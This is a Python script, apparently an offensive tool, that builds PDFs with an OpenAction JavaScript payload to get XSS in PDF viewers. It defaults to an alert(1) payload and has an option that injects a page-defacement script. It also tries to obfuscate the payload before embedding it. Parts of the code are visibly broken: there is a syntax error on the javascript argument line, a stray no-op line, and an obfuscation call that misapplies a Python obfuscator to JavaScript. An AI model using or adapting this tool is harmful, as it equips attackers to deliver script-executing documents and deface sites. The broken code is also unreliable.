import sys
import argparse
import webbrowser
from datetime import datetime
from colorama import Fore, Style
import pyarmor.pytransform as pytransform

if sys.version_info[0] < 3:
    raise SystemExit("Use Python 3 (or higher) only")

Fore.RED, Style.RESET_ALL 

def generate_payload():
    return 'alert(1)'

def sanitize_javascript_code(javascript_code):
    # Sanitize JavaScript code to meet PDF viewer capabilities
    try:
        sanitized_code = javascript_code.replace('\n', '').replace('\r', '').replace('\t', '').strip()
        return sanitized_code
    except Exception as e:
        print(f"Error during JavaScript code sanitization: {e}")
        sys.exit(1)

def obfuscate_javascript_code(javascript_code):
    try:
        obfuscated_code = pytransform.pyarmor_obfuscate(javascript_code)
        return obfuscated_code
    except Exception as e:
        print(f"Error during JavaScript code obfuscation: {e}")
        sys.exit(1)

def create_malpdf(filename, javascript_code, metadata, defacement_code=None):
    try:
        with open(filename, "w") as file:
            file.write(f"%PDF-1.7\n")

            if metadata:
                file.write(f"1 0 obj\n<</Pages 1 0 R /OpenAction 2 0 R /Info {metadata}>>\n")
            else:
                file.write(f"1 0 obj\n<</Pages 1 0 R /OpenAction 2 0 R>>\n")

            file.write("2 0 obj\n<</S /JavaScript /JS ({})>>\n".format(javascript_code))

            if defacement_code:
                file.write("<< /S /JavaScript /JS ({}) >>\n".format(defacement_code))

            file.write("trailer <</Root 1 0 R>>")

    except Exception as e:
        print(f"Error during PDF creation: {e}")
        sys.exit(1)

def render_pdf_in_browser(pdf_filename):
    try:
        webbrowser.open(pdf_filename, new=2)
    except Exception as e:
        print(f"Error during PDF rendering: {e}")

def print_banner():
    banner = fr'''
{Fore.RED} _______  _______  _______  _______  ___      _______  __   __   
|       ||       ||       ||   _   ||   |    |       ||  | |  |
|  _____||_     _||    ___||  |_|  ||   |    |_     _||  |_|  |
| |_____   |   |  |   |___ |       ||   |      |   |  |       |
|_____  |  |   |  |    ___||       ||   |___   |   |  |       |
 _____| |  |   |  |   |___ |   _   ||       |  |   |  |   _   |
|_______|  |___|  |_______||__| |__||_______|  |___|  |__| |__|  
               The Way to gain an XSS from PDF
                     Created By heshamm1{Style.RESET_ALL}
                     '''
    print(banner)

if __name__ == "__main__":
    print_banner()

    parser = argparse.ArgumentParser(description="Generate a PDF with custom JavaScript code.")
    parser.add_argument("-o", "--output", help="Output PDF file name", required=True)
    parser.add_argument("-p", "--payload", action="store_true", help="Generate a default payload")
    parser.add_argument("-js", "--javascript", help="JavaScript code to be executed in the PDF")
    parser.add_argument("-r", "--render", action="store_true", help="Render the generated PDF in the default browser")
    parser.add_argument("-m", "--metadata", help="PDF metadata in the format '/Title (Title) /Author (Author) /Subject (Subject)'")
    parser.add_argument("--defacement", action="store_true", help="Include web defacement JavaScript")

    args = parser.parse_args()

    try:
        if args.payload:
            javascript_code = generate_payload()
        elif args.javascript:a
            javascript_code = args.javascript
        else:
            raise ValueError("Please provide either a payload or custom JavaScript code.")

        sanitized_javascript = sanitize_javascript_code(javascript_code)
        obfuscated_javascript = obfuscate_javascript_code(sanitized_javascript)

        metadata = args.metadata

        defacement_code = 'document.body.innerHTML = \'<h1>Website Defaced</h1>\';' if args.defacement else None

        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        pdf_filename = f"{args.output}_{timestamp}.pdf"

        print(f"[+] Creating PDF file: {pdf_filename}")
        create_malpdf(pdf_filename, obfuscated_javascript, metadata, defacement_code)
        print("[+] Done!")

        if args.render:
            print("[+] Rendering PDF in the default browser...")
            render_pdf_in_browser(pdf_filename)

    except Exception as e:
        print(f"Error: {e}")
